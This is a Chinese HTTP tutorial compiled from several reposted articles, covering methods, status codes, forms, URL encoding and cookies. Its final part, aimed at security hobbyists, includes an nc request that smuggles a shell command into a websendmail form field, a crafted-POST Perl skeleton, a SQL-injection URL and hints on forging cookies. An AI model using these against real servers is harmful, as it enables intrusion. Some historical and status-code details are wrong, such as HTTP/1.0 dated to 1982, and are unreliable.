## http {#http}

http 协议

除了TCP/IP协议，http可以说是最重要，且使用最多的网络协议了。本节简要介绍一下http协议的工作原理。

假设现在有一个html文件:http.html, 存放在Web服务器上，其URL为 www.myweb.com/http.html ,文件内容为:

HTML 代码:

&lt;html&gt;

&lt;head&gt;

&lt;title&gt;http.html&lt;/title&gt;

&lt;/head&gt;

&lt;body&gt;

hello, http

&lt;/body&gt;

&lt;/html&gt;

现在，一个用户通过IE访问该地址，IE首先将此地址的域名通过DNS转换为一个IP地址，然后通过一个Web服务器开放的端口（默认为80，不为80需在域名后加上&quot;:端口号&quot;，例如 www.myweb.com:81 ）与其连接, 然后传送一个类似这样的http请求（使用flashget等下载软件下载文件时，在详细信息里也可以看到类似的信息）:

GET /http.html HTTP/1.1

Host:www.myweb.com

Accept: */*

User-Agent: Mozilla/4.0 (compatible; MSIE.6.0; Windows NT 5.1)

Pragma: no-cache

Cache-Control: no-cache

Connection: close

[空行]

请求的第一行为请求内容, 表示通过GET方法向服务器请求资源，/http.html为请求资源名称，HTTP/1.1 表示使用http协议，版本1.1。然后接下来的几行称为请求信息的标头(header)，其中描述了请求的一些其他信息，比如客户端浏览器标识等。最后一个空行表示请求结束。

当Web服务器接收到该请求时，服务器检查所请求的资源是否有效，且是否有相应的权限。如果没有问题，则服务器会传回类似如下的http响应信息:

HTTP/1.1 200 OK

Server: Microsoft-IIS/5.0

Date: Thursday, March 31, 2005 17:15:23 GMT

Content-Type: text/html

Content-Length: 88

[空行]

&lt;html&gt;

&lt;head&gt;

&lt;title&gt;http.html&lt;/title&gt;

&lt;/head&gt;

&lt;body&gt;

hello, http

&lt;/body&gt;

&lt;/html&gt;

其中第一行的&quot;200&quot;是一个状态码，表示服务器成功完成该请求，如果不成功会返回其他状态码。Content-Type表示返回的数据类型，Content-Length表示返回的数据长度。空行表示标头结束，下面则是浏览器根据请求返回的数据内容，这里是http.html的文件内容，浏览器解析html源代码，将Web页面呈现给用户，到这里就完成了一次成功的http通信。

以上内容是Web通信的基础，就和Windows消息机制一样，你可能不会用到它，但是你必须了解它，你得知道那些高级的东西隐藏了哪些低级的内容，这样对你理解和使用那些高级的东西都有非常大的帮助:)。

2\. html form

前面的http.html文件是一个最简单的静态html页面，但作为一个Web程序，它实在是太简陋了，它不接受用户输入，永远显示一样的内容。我们需要能够根据用户输入来返回相应的数据。

看下面的html代码:

&lt;html&gt;

&lt;head&gt;

&lt;title&gt;form.html&lt;/title&gt;

&lt;/head&gt;

&lt;body&gt;

    &lt;form method=&quot;get&quot;&gt;

          &lt;input type=&quot;text&quot; name=&quot;p&quot; /&gt;

          &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;

    &lt;/form&gt;

&lt;/body&gt;

&lt;/html&gt;

观察这段代码，其中有一个html form，其内容包括在&lt;form&gt;和&lt;/form&gt;之间, 其中有一个提交按钮(&lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;)，当用户点击该按钮时，浏览器将html form中的所有输入提交给Web服务器，form标签的method属性指定了提交的方式，这里为get，这个get对应http请求中的GET请求方法,form中的输入均以查询字符串的方式附加在URL上, 在文本框里输入一个字符串，比如&quot;form&quot;，然后观察浏览器的地址栏,会变成类似 [http://www.myweb.com/form.html?p=form](http://www.myweb.com/form.html?p=form) ，这是因为浏览器发出了这样的GET请求:

GET /form.html?p=form HTTP/1.1

...

...

[空行]

假如&lt;form&gt;标签的method属性为&quot;post&quot;,即令浏览器使用post方法发送该请求，当使用post方法时，用户的输入并不是通过URL来传输的，而是浏览器将内容放在POST请求的标头之后发送给Web服务器的:

POST /form.html HTTP/1.1

...

...

Content-Type: application/x-www-form-urlencoded

Content-Length: 6

[空行]

p=form

浏览器将用户输入使用GET或者POST方法发送给Web服务器，这个过程称为&quot;回发(Postback)&quot;。这个概念相当重要，在Web应用程序中经常涉及到回发。

++++++++

HTTP请求方法及响应码详解（http get post head）

2010年12月01日 星期三 16:30

转载自 wait100

最终编辑 wait100

HTTP是Web协议集中的重要协议，它是从客户机/服务器模型发展起来的。客户机/服务器是运行一对相互通信的程序，客户与服务器连接时，首先，向服务 器提出请求，服务器根据客户的请求，完成处理并给出响应。浏览器就是与Web服务器产生连接的客户端程序，它的端口为TCP的80端口，。浏览器与Web 服务器之间所遵循的协议就是HTTP。

HTTP的早期版本为HTTP/0.9，它适用于各种数据信息的简洁快速协议，但是其远不能满足日益发展各种应用的需要。 但HTTP/0.9作为HTTP协议具有典型的无状态性：每个事务都是独立进行处理的，当一个事务开始就在客户与服务器之间建立一个连接，当事务结束时就 释放这个连接。HTTP/0.9包含Simple-Request&amp;Simple-Responsed的报文结构。但是客户无法使用内容协商，所 以服务器也无法返回实体的媒体类型。

1982年，Tim Berners-Lee提出了HTTP/1.0，在此后的不断丰富和发展中，HTTP/1.0成为最重要的面向事务的应用层协议。该协议对每一次请求/响 应，建立并拆除一次连接。其特点是简单、易于管理，所以它符合了大家的需要，得到了广泛的应用。其缺点是仍会发生下列问题：对用户请求响应慢、网络拥塞严 重、安全性等。

1997年形成的HTTP/1.1，也就是现在普遍使用的协议，在持续连接操作机制中实现流水方式，即客户端需要对同一服务器 发出多个请求时，其实现在多数的网页都是有多部分组成（比如多张图片），可用流水线方式加快速度，流水机制就是指连续发出多个请求并等到这些请求发送完 毕，再等待响应。这样就大大节省了单独请求对响应的等待时间，使我们得到更快速的浏览。

另外，HTTP/1.1服务器端处理请求时按照收到的顺序进行,这就保证了传输的正确性。当然，服务器端在发生连接中断时，会自动的重传请求，保证数据的完整性。

HTTP/1.1还提供了身份认证、状态管理和Cache缓存等机制。这里，我想特别提一下关于HTTP/1.1中的Cache缓存机制对 HTTP/1.0的不足之处的改进，它严格全面，既可以减少时间延迟、又节省了带宽。HTTP/1.1采用了内容协商机制，选择最合适的用户的内容表现形 式。

现在，很多地方都有用到的虚拟主机技术在HTTP/1.1中也可以实现。所谓的虚拟主机技术，就是同一主机地址实际对应多台主机。通俗的 讲，当你同时在一个网站申请两个主页时，用协议分析仪可以发现其实这两个主页对应的是同一个IP地址。这样用多台完全相同的机器形成WWW服务器就可以提 高处理的吞吐量。

传统的解决方案是改造域名服务器使其可以根据一定的算法将同一域名解释成不同的IP地址。分别对应虚拟主机的每台机器，其缺点是要求每台机器占用完全独立的IP地址，这与IP地址的缺乏是相矛盾的。

HTTP/1.1提供的解决方案在HTTP协议自身中加入了指定不同主机的功能，从而多台主机可以共享一个IP地址，既提高了性能又便于管理。

因为HTTP/1.1是Internet现行的标准协议，这里详细介绍其相关语法。

首先，HTTP/1.1格式可写为：

其中请求方法是请求一定的Web页面的程序或用于特定的URL。可选用下列几种：

GET： 请求指定的页面信息，并返回实体主体。

HEAD： 只请求页面的首部。

POST： 请求服务器接受所指定的文档作为对所标识的URI的新的从属实体。

PUT： 从客户端向服务器传送的数据取代指定的文档的内容。

DELETE： 请求服务器删除指定的页面。

OPTIONS： 允许客户端查看服务器的性能。

TRACE： 请求服务器在响应中的实体主体部分返回所得到的内容。

PATCH： 实体中包含一个表，表中说明与该URI所表示的原内容的区别。

MOVE： 请求服务器将指定的页面移至另一个网络地址。

COPY： 请求服务器将指定的页面拷贝至另一个网络地址。

LINK： 请求服务器建立链接关系。

UNLINK： 断开链接关系。

WRAPPED： 允许客户端发送经过封装的请求。

Extension-mothed：在不改动协议的前提下，可增加另外的方法。

比如：

GET /index.html HTTP/1.1

Accept: text/plain /*纯ASCII码文本文件*/

Accept: text/html /*HTML文本文件*/

User-Agent:Mozilla/4.5(WinNT)

说明浏览器使用Get方法请求文档/index.html。浏览器则只允许接收纯ASCII码文本文件和HTML文本文件，其使用的引擎是Mozilla/4.5（Netscape）。

当服务器响应时，其状态行的信息为HTTP的版本号，状态码，及解释状态码的简单说明。现将5类状态码详细列出：

① 客户方错误

100　 继续

101　 交换协议

② 成功

200 　OK

201 　已创建

202　 接收

203　 非认证信息

204　 无内容

205 　重置内容

206　 部分内容

③ 重定向

300 　多路选择

301　 永久转移

302　 暂时转移

303　 参见其它

304 　未修改（Not Modified）

305　 使用代理

④ 客户方错误

400　 错误请求（Bad Request）

401 　未认证

402 　需要付费

403　 禁止（Forbidden）

404　 未找到（Not Found）

405　 方法不允许

406　 不接受

407　 需要代理认证

408　 请求超时

409　 冲突

410 　失败

411 　需要长度

412　 条件失败

413 　请求实体太大

414 　请求URI太长

415 　不支持媒体类型

⑤ 服务器错误

500　 服务器内部错误

501　 未实现（Not Implemented）

502　 网关失败

504 　网关超时

505 HTTP版本不支持

比如：（在《TELNET……》一文中用telnet登陆80端口,相同的方法用在HTTP/1.1中,会发现没有显示，下面补充说明之）

telnet www.fudan.edu.cn 80

HEAD / HTTP/1.1

host:www.fudan.edu.cn /*本行为输入内容*/

HTTP/1.1 501 Method Not Implemented

Date: Web, 01 Nov 2000 07:12:29 GMT /*当前的日期/时间*/

Server: Apache/1.3.12 (Unix) /*Web服务器信息*/

Allow: GET, HEAD, OPTION, TRACE /*支持的方法类型*/

Connection: close

Connect-Type: Text/html; charset=iso-8859-1/*连接的媒体类型*/

&lt;!DOCTYPE HTML PUBLIG &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;

&lt;HTML&gt;&lt;HEAD&gt;

&lt;TITLE&gt;501 Method

Not Implemented&lt;/TITLE&gt;

&lt;/HEAD&gt;&lt;BODY&gt;

&lt;H1&gt;Method Not Implemented&lt;/H1&gt;

head to /inde

x.html not supported.&lt;P&gt;

Invalid method in request head / htp/1.1&lt;P&gt;

&lt;HR&gt;

&lt;ADDRESS&gt;

Apache/1.3.12 Server at www.fudan.edu.cn Port 80&lt;/ADDRESS&gt;

&lt;/BODY&gt;&lt;/HTML&gt;

关于实体头部的内容还可以有：

Last Modified ：请求文档的最近修改时间。

Expires ：请求文档的过期时间。

Connect-length：文档数据的长度。

WWW-authenricate：通知客户端需要的认证信息。

Connect-encoding ：说明有无使用压缩技术。

Transfer-encoding ：说明采用的编码变换类型。

随着Internet的发展，下一代的HTTP协议HTTP-ng已经在酝酿之中，它将会提供更好的安全性、更快的速度，其改进要点为：模块化强、网络效率高、安全性更好、结构更简单。

Trackback: [http://tb.blog.csdn.net/TrackBack.aspx?PostId=1759249](http://tb.blog.csdn.net/TrackBack.aspx?PostId=1759249)

http 是一个相对简单的协议，它定义了客户（通常通过浏览器）和www服务器之间的会话过程。现在我们来看看这个会话过程的简要说明：客户打开与服务器的套接，使用的端口通常是80。然后它服务器发送请求行，请求标题，最后是请求空行。客户的请求通常是请求文档，它可以是文本文件，图片或者是程序等。服务器接受这个请求，然后查找请求的数据，最后根据查找的结果做出响应。如果上面的过程是一个cgi程序的话，那么服务器将会执行这个程序，并将程序执行的结果输给客户端。所以不明白cgi程序的朋友，可以这样理解cgi程序，它可以用很多的语言来写，只要它能完成一个任务：分析客户请求行中的数据，然后代替服务器做出响应！我们今天要讨论的就是从客户端的角度来理解这个问题，首先来看一个标准的客户请求格式：

请求方法 文挡地址 http/版本

请求标题：数据1

…………….

请求标题：数据N

空白行

在上面的格式中，第一行是必须的，它指明请求的文挡，又称请求头。下面的是请求标题可以多个。最后的空白行表示终止。这里还有一个问题，如果请求方法是 POST的话那么空白行后面还可以发送附加数据。这里有一个非常重要的问题就是请求方法。无论对于我们cgi新手还是喜欢web安全的朋友，都是必须的知识

这是一个典型的请求头：

GET /bbs/login.asp HTTP/1.0

其中GET就是一个请求方法。/bbs/login.asp是文挡的地址即URI，它是URL的一部分。HTTP/1.0 是http 协议的版本号。这种方式的请求是建立在已经和服务器的套接建立的基础上的。完整的URL 可以是这样的方式： [http://www.target.com/bbs/login.asp](http://www.target.com/bbs/login.asp) 。在http 1.0的协议里定义了三种请求方式：GET，POST，HEAD。http 1.1又补充了一些，如PUT，DELETE，OPTIONS和TRACE。现在也越来越多的服务器支持这些方法。下面我们来介绍一下常用的方法。

GET 这个是浏览器用语向服务器请求最常用的方法。我们在浏览器上发送的URL就是一个GET请求，当然我们也可以用程序，比如netcat，webget等来做。我们有的时候在看到一些黑客高手们在文章中提到的一些请求的例子，可能新手朋友们很难理解，比如：

[http://www.target.com/bbsxp165/bbsxp/searc...password)&gt;1](http://www.target.com/bbsxp165/bbsxp/searc...password)%3e1) )  

这就是一个相当复杂的GET请求，/searchok.asp?是请求这个asp文件，后面就是要传输给这个程序的数据，这个数据是根据网页的交互固定的。服务器接受这个请求后这些数据将被放入环境变量QUERY_STRING中。数据通常是一些数据名/数据值对。没对数据名/数据值之间用&amp;来分开。例子的提交里forumid=()空格里的是一个sql语句，这是由于这里存在sql injection漏洞，当然不在我们讨论的范围。还有GET请求的数据不能超过一个特定的长度，比如2000字节。

POST 这个方法也是用来传送数据的，但是与GET不同的是，使用POST的时候，数据不是附在URI后面传递的，而是要做为独立的行来传递，此时还必须要发送一个Content_length标题，以标明数据长度，随后一个空白行，然后就是实际传送的数据。网页的表单通常是用POST来传送的。这里我们来举两个安全人士常用的提交方式，通常就是黑客们所谓的发现某个网页的或者某个cgi程序的漏洞然后构造一个特殊请求的时候用的：

1，脚本实现

…………

$socket = IO::Socket::INET-&gt;new(PeerAddr =&gt; $host, PeerPort =&gt; $port, Proto =&gt; &quot;tcp&quot;, Type =&gt; SOCK_STREAM) or die &quot;can&amp;apos;t connect to the host\n&quot;;

print $socket &quot;POST /$b HTTP/1.1\r\n&quot;;

print $socket &quot;Host: $host\r\n&quot;;

print $socket &quot;Content-Type: text/xml\r\n&quot;;

print $socket &quot;Content-length: $length\r\n\r\n&quot;;

print $socket &quot;$data\r\n&quot;;

$socket-&gt;recv($rbuf,500);

close($socket);

……….

以上是perl程序POST提交的主体部分，比如一个溢出程序，关键的地方就在于$b（URI）和$data 的构造上！

2， 使用nc来提交

建立一个hack.txt的文件输入下面的内容：

POST /cgi-bin/websendmail HTTP/1.0

Content-length: xxx (should be replaced with the actual length of the

string passed to the server, in this case xxx=90)

receiver=;mail+your_address\@somewhere.org  

然后用nc来请求

nc www.victim.com 80 &lt;hack.txt

这样就完成了一个post的提交，当然还有很多别的方法可以实现这个提交，这里只是举两个我认为方便的办法。

HEAD 方法和GET的语法是一样的，如果用HEAD方法请求的话，则服务器返回的只是响应标题，而不会返回被请求的文挡，HEAD方法通用于一些搜索引擎中，当然我们的cgi扫描软件很多都是使用这个方式请求的。

以下方法属于http 1.1的标准，我们目前使用的还少，简单的介绍一下定义。

PUT 可以将客户提交的文挡保存在服务器的URI上

DELETE 用于请求服务器删除指定的URI

OPTIONS 可以请求对于指定URI可用的通用选项信息

TRACE请求服务器将附加的文挡无变更的返回，主要用于调试。

提到了请求，自然要讲一下，服务器的响应了，它的标准格式如下

HTTP/版本号 状态码 消息

响应标题：数据1

………….

响应标题：数据N

空白行

客户提交的文挡

看个例子吧:

nc www.victim.com 80

GET /index.html  

HTTP/1.1 400 Bad Request  

Date: Tue, 14 May 2002 07:03:02 GMT  

Server: Apache  

Connection: close  

Transfer-Encoding: chunked  

Content-Type: text/html; charset=iso-8859-1  

127

……………

响应预定义的状态码有很多，通常是服务器默认的设置，是三位数，以1，2，3，4，5开头的

1xx 主要用于调试和实验的目的  

2xx 主要表示请求成功  

3xx 表示请求的uri有多个选择或者已经移动位置了  

4xx 400表示请求行中有语法错误，404表示文挡不存在

5xx 表示服务器内部错误

有的时候可能大家总是忽略了这些东西的做用，事实上有的时候他们的作用还真的不小，比如我们手头没有任何工具，如何知道服务器上是否有 ida,printf等映射呢，我们可以这么请求： [http://www.victim.com/*.ida](http://www.victim.com/*.ida) 如果出现500 服务器内部错误，我想问题就已经很清楚了。

既然都说这么多的废话了，那么再给大家来点关于URL编码，数据传输的小知识，和cookies的一些介绍吧。

URL编码和数据传输

下面是一个例子：

[http://www1.baidu.com/baidu?word=netcat+ex...gb2312&amp;cl=3&amp;f=1](http://www1.baidu.com/baidu?word=netcat+ex...gb2312&cl=3&f=1)

通常我们的浏览器在发送数据的时候要先经过编码，这是一种规范。GET 和POST 都是一样的，当然对于表单你可以用enctype字段来规定其他的编码方式。上面的例子语法，格式是用HEAD请求的。我们看到其中有一些特殊的符号如&quot;%&quot;，这是由于当数据中有非字母或数据的字符时，URL编码会将该字符转化为其ASCII码对应的数字，这样便以一个两位数字的16进制编码来代表字符。在 URL 编码中由百分号指示。 因此，%25 表示百分号本身（25是十六进制的，就是以 16 为基，代表百分号的 ASCII 码值），所有127（7fhex) 以上，和 33 （21hex) 以下的所有字符都会被转义，这包含空格符，空格的转义符为 %20\. 加号被解释为空格符。

cookies 内容简介

cookies的作用，这里我就不说了，光是对它语法和格式本身就进介绍，我们先来看一个cookies的例子

aspsky

userhidden=2&amp;password=469e80d32c0559f8&amp;userid=1&amp;userclass=%B9%DC%C0%ED%D4%B1&amp;username=admin&amp; usercookies=1

localhost/bbs/

0

3061727232

29562033

2222055456

29561914

*

参考这个例子我们来看看cookies 的 properties 主要包括：

key --&gt;aspsky

value--&gt;userhidden=2&amp;password=469e80d32c0559f8&amp;userid=1&amp;userclass=%B9%DC%C0%ED%D4%B1&amp;usernam e=admin&amp;usercookies=1

damain--&gt;localhost/bbs/

secure--&gt;0 相当于no

expire--&gt;3061727232 29562033 有效时间需要解码才能读出来

modified--&gt;3061727232 29562033 修改时间，解码方式和expire一样

created in -&gt;server

有的时候还有ip address

以上这些介绍只是方便大家对cookies的理解，具体的请参考一些专业的资料。有的时候经常遇到一些朋友问起怎么伪造cookies，我想写到这里已经非常清楚了。

说了这么多，总结一下吧

如果你是一个新手的话，如果你对http协议不是很清楚的话，建议你好好读读一些资料，毕竟这个是我们一天到晚泡网的基础哦，如果你是一个和我一样，喜欢研究网络编程安全的朋友，那么希望我们能一起交流，一起进步。本文只是简单的介绍了一下http方面的一些基础知识，并没有深入的讲述，在一定程 度上说只是给新手朋友们一个概念，但是对于大家理解在网络一些高手的精彩文章，还是相当有用的。